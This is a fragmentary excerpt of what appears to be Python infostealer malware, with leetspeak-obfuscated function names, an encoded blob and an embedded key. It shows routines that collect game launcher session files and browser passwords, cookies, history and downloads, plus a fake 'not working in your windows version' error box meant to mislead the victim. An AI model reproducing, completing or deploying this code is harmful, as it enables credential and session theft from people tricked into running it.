...
b3i0lkKScdnqFeklwZmnNGNkeHCqzAhykGlabVCbz9zPt8e+ukHpVezCNyvuEZR27onHIgOxHvLlNxTD/8UUU0OhGxGJzj5ALy7YKE413qyHpW47xmYrOebn1ILTAyPwzCR0OtYnLEfcP4gqqNL/jJcTXYCBMf8LwCK2zS09i2l1V9KhtXrMqWRzX8UYlVVMOtAcaCbtQ0FqYhCxx1tDhQ==
"""

v4r_k3y            = "bdydtXqVDcsWZFpJqYrDlXAocerkIosyAsjcFwclLTqyZrljHgojIQbhNgEJtrOmlrsxOMhyNUtbXdIPLxMMYkEZiNnnmcXmpZVcPumg"
...
def D3f_S3ssi0nFil3s(v4r_zip_file):
    ...
    v4r_session_files_choice = ["Game Launchers"]
...
def D3f_Br0w53r5t341(v4r_zip_file):
    ...
    v4r_browser_choice = ["passwords", "cookies", "history", "downloads"]
    v4r_browsers = []
...
def D3f_F4k33rr0r():
    ...
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("error 404!", "not working in your windows version")
